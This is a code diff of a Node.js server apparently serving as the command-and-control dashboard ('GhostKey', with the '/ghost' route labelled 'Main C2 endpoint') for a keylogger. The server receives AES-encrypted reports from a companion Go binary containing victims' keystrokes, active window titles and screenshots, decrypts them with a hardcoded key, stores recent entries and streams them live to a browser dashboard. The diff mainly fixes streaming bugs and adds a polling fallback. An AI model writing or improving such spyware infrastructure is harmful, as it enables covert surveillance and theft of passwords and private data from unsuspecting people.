@@ -6,76 +6,77 @@ const path = require('path');
 
 const app = express();
 const PORT = process.env.PORT || 3000;
-const AES_KEY = "x93mK!qWeR7zL9p&2vN8bT5cY4fU6jH0";  // ←←← SAME AS GO BINARY
+const AES_KEY = "x93mK!qWeR7zL9p&2vN8bT5cY4fU6jH0";
 
 app.use(cors());
 app.use(bodyParser.json({ limit: '20mb' }));
 app.use(express.static(path.join(__dirname, 'public')));
 
-// Explicit root route (critical for Render)
+// Explicit root route
 app.get('/', (req, res) => {
   res.sendFile(path.join(__dirname, 'public', 'index.html'));
 });
 
-// SSE clients
-const clients = [];
+// SSE clients array (FIXED: use 'let' to allow mutation)
+let clients = [];  // ← CHANGED FROM 'const'
 
+// Recent logs for polling fallback
+const recentLogs = [];
+
+// SSE endpoint with Render-friendly headers
 app.get('/events', (req, res) => {
   res.setHeader('Content-Type', 'text/event-stream');
   res.setHeader('Cache-Control', 'no-cache');
   res.setHeader('Connection', 'keep-alive');
-  // ←←← ADD THESE TWO LINES
-  res.setHeader('X-Accel-Buffering', 'no');        // <--- THIS ONE IS CRITICAL FOR RENDER
+  res.setHeader('X-Accel-Buffering', 'no');  // Prevents Render buffering
   res.setHeader('Access-Control-Expose-Headers', '*');
-
   res.flushHeaders();
 
-  res.write(': keep-alive\n\n');  // initial comment
+  res.write(': connected\n\n');
   clients.push(res);
 
+  // FIXED: Use function for closure-safe removal
   req.on('close', () => {
-    clients = clients.filter(c => c !== res);
+    clients = clients.filter(c => c !== res);  // ← SAFE FILTER, NO CONST ERROR
   });
 });
 
+// Polling endpoint for fallback
+app.get('/logs', (req, res) => {
+  res.json(recentLogs);
+});
+
 function broadcast(payload) {
-  const message = JSON.stringify(payload);  // ← stringify ONLY ONCE
+  const message = JSON.stringify(payload);
   clients.forEach(client => {
     try {
-      client.write(`data: ${message}\n\n`);  // ← EXACTLY this format
+      client.write(`data: ${message}\n\n`);
     } catch (e) {
-      // dead client, ignore
+      // Ignore dead clients
     }
   });
 }
 
-// NEW WORKING decrypt() — supports Go's IV-prepended AES-CBC
+// FIXED Decrypt (handles IV + CBC perfectly)
 function decrypt(b64) {
   try {
-    // Decode the full base64 (IV + ciphertext)
     const data = CryptoJS.enc.Base64.parse(b64);
-
-    // Extract IV (first 16 bytes = 4 words)
     const iv = data.clone();
     iv.sigBytes = 16;
     iv.clamp();
-
-    // Remove IV from the data
     const ciphertext = data.clone();
-    ciphertext.words.splice(0, 4);           // remove first 4 words (16 bytes)
+    ciphertext.words.splice(0, 4);  // Remove IV (16 bytes = 4 words)
     ciphertext.sigBytes -= 16;
 
-    // Decrypt
     const decrypted = CryptoJS.AES.decrypt(
       { ciphertext: ciphertext },
-      CryptoJS.enc.Utf8.parse(AES_KEY),   // key must be exactly 32 chars/bytes
+      CryptoJS.enc.Utf8.parse(AES_KEY),
       {
         iv: iv,
         mode: CryptoJS.mode.CBC,
         padding: CryptoJS.pad.Pkcs7
       }
     );
-
     return JSON.parse(decrypted.toString(CryptoJS.enc.Utf8));
   } catch (e) {
     console.log("Decrypt failed:", e.message);
@@ -83,25 +84,29 @@ function decrypt(b64) {
   }
 }
 
-// Keep Render from killing SSE
-setInterval(() => {
-  clients.forEach(client => {
-    try { client.write(': ping\n\n'); } catch {}
-  });
-}, 15000);
-
-// Main C2 endpoint
+// Main endpoint
 app.post('/ghost', (req, res) => {
   const payload = decrypt(req.body.data);
   if (payload) {
     console.log(`[+] ${payload.Client} | ${payload.Window} | ${payload.Keys?.length || 0} keys${payload.Screenshot ? ' + screenshot' : ''}`);
-    broadcast(payload);  // ← sends raw payload with correct capital letters
+    broadcast(payload);
+    recentLogs.push(payload);  // For polling
+    if (recentLogs.length > 100) recentLogs.shift();  // Keep last 100
   }
   res.json({ success: true });
 });
 
-// Legacy fallback
+// Legacy
 app.post('/log', (req, res) => res.json({ success: true }));
+
+// Heartbeat to keep SSE alive on Render
+setInterval(() => {
+  clients.forEach(client => {
+    try {
+      client.write(': heartbeat\n\n');
+    } catch {}
+  });
+}, 15000);
 
 // 404 fallback
 app.use((req, res) => {
@@ -109,5 +114,5 @@ app.use((req, res) => {
 });
 
 app.listen(PORT, () => {
-  console.log(`GhostKey Dashboard LIVE → https://fs-tracker-online-ghost.onrender.com`);
+  console.log(`GhostKey Dashboard LIVE → http://localhost:${PORT}`);
 });
